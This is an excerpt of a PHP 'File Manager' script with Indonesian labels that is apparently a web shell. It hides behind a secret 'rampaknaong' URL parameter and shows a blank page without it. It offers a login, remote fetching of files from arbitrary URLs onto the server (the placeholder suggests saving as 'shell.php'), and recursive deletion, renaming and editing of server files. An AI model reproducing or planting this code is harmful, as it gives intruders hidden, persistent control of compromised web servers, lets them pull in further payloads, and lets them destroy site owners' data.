 ...
 ***/
session_start();
if (!isset($_GET['rampaknaong']) && !isset($_POST['rampaknaong'])) {
    die('');
}
...
if (!isset($_SESSION['loggedin'])) {
    ...
    echo '<form method="POST">
            <input type="hidden" name="rampaknaong" value="">
...
// === REMOTE UPLOAD / FETCH (FITUR BARU dari litespeed_ultimate) ===
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['remote_url']) && !empty($_POST['remote_url'])) {
    $remote_url = trim($_POST['remote_url']);
    $save_as = !empty($_POST['remote_name']) ? basename($_POST['remote_name']) : basename(parse_url($remote_url, PHP_URL_PATH));
    if (empty($save_as) || $save_as === '' || $save_as === '/') {
        $save_as = 'remote_fetch.php';
    }
    $dest = rtrim($dir, '/\\') . DIRECTORY_SEPARATOR . $save_as;
    $res = false;

    // Coba pakai cURL dulu
    ...
    if ($res !== false && strlen($res) > 0) {
        if (file_put_contents($dest, $res) !== false) {
            $msg = "✅ Remote Upload Berhasil! File disimpan sebagai: " . htmlspecialchars($save_as) . " (" . strlen($res) . " bytes)";
        } else {
            $msg = "❌ Gagal menyimpan file! Periksa permission folder.";
        }
    } else {
        $error_detail = '';
        if (isset($curl_error) && !empty($curl_error)) {
            $error_detail = " (cURL Error: $curl_error)";
        }
        $msg = "❌ Gagal mengambil file dari URL!$error_detail";
    }
}
// === UPDATE ===
...
if (isset($_POST['delete'])) {
    ...
    if (is_dir($target)) {
        // Recursive delete untuk folder yang tidak kosong
...
<head>
    ...
    <style>
        ...
        .tools-box { background:white; padding:12px; border:1px solid #ddd; margin-bottom:15px; border-radius:4px; }
        .tools-box form { display:inline-block; margin-right:15px; margin-bottom:5px; }
        .tools-box .section-title { font-weight:bold; margin-bottom:8px; color:#555; font-size:0.9em; }
        .remote-box { background:#fff3cd; padding:12px; border:1px solid #ffc107; margin-bottom:15px; border-radius:4px; }
        .remote-box input[type=text] { width:250px; }
        .remote-box input[type=submit] { background:#ffc107; color:#333; font-weight:bold; }
        .remote-box input[type=submit]:hover { background:#e0a800; }
    </style>
</head>
<body>
<div class="topbar">
    <h2>File Manager - <?php echo htmlspecialchars($dir); ?></h2>
    <a class="logout" href="?rampaknaong&logout=1">Logout</a>
</div>
<!-- Server Info -->
...
<?php if (!empty($msg)): ?>
    <div class="message <?php echo (strpos($msg, '✅') !== false) ? 'success' : ((strpos($msg, '❌') !== false) ? 'error' : ''); ?>"><?php echo $msg; ?></div>
<?php endif; ?>
<!-- Navigasi manual -->
<form method="GET">
    <input type="hidden" name="rampaknaong" value="">
...
<!-- FITUR BARU: Remote Upload / Fetch -->
<div class="remote-box">
    <div class="section-title">🌐 Remote Upload (Fetch dari URL)</div>
    <form method="POST">
        <input type="hidden" name="rampaknaong" value="">
        <input type="text" name="remote_url" placeholder="URL file (contoh: https://raw.github...)" style="width:350px;">
        <input type="text" name="remote_name" placeholder="Simpan sebagai (contoh: shell.php)" style="width:200px;">
        <input type="submit" value="⬇ Fetch">
    </form>
    <small style="color:#856404;">Gunakan URL raw file. Mendukung cURL & file_get_contents sebagai fallback.</small>
</div>
<hr>
<!-- List isi folder -->
<?php
if (is_dir($dir)) {
    ...
    foreach ($files as $f) {
        ...
        if ($f === '..') {
            $parent = dirname($dir);
            echo "<td><a href='?rampaknaong&dir=".urlencode($parent)."'>[..]</a></td><td>Parent</td><td>-</td><td>-</td>";
        } elseif (is_dir($path)) {
            echo "<td><a href='?rampaknaong&dir=".urlencode($path)."'>".$f."</a></td><td>Folder</td><td>-</td>";
            echo "<td>
                <form class='inline' method='POST'><input type='hidden' name='rampaknaong' value=''><input type='hidden' name='delete' value='".$f."'><input class='danger' type='submit' value='Delete' onclick='return confirm(\"Hapus folder ini beserta isinya?\")'></form>
                <form class='inline' method='POST'><input type='hidden' name='rampaknaong' value=''><input type='hidden' name='oldname' value='".$f."'><input type='text' name='rename' placeholder='Rename'><input type='submit' value='OK'></form>
            </td>";
        } else {
            echo "<td><a href='?rampaknaong&dir=".urlencode($dir)."&view=".urlencode($f)."'>".$f."</a></td><td>File</td><td>".filesize($path)." bytes</td>";
            echo "<td>
                <form class='inline' method='POST'><input type='hidden' name='rampaknaong' value=''><input type='hidden' name='delete' value='".$f."'><input class='danger' type='submit' value='Delete' onclick='return confirm(\"Hapus file ini?\")'></form>
                <form class='inline' method='POST'><input type='hidden' name='rampaknaong' value=''><input type='hidden' name='oldname' value='".$f."'><input type='text' name='rename' placeholder='Rename'><input type='submit' value='OK'></form>
                <a href='?rampaknaong&dir=".urlencode($dir)."&edit=".urlencode($f)."'>Edit</a>
            </td>";
        }
        echo "</tr>";
    }
